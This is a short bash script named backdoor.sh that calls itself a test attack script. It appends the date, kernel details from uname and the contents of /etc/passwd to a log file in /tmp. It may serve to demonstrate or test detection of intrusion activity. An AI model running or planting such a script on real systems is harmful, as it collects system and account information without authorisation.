#!/bin/bash
#backdoor.sh
#this is test attack script
echo `date` >> /tmp/attack.log 
echo `uname -a` >> /tmp/attack.log
cat /etc/passwd >> /tmp/attack.log
echo ‘================’ >> /tmp/attack.log

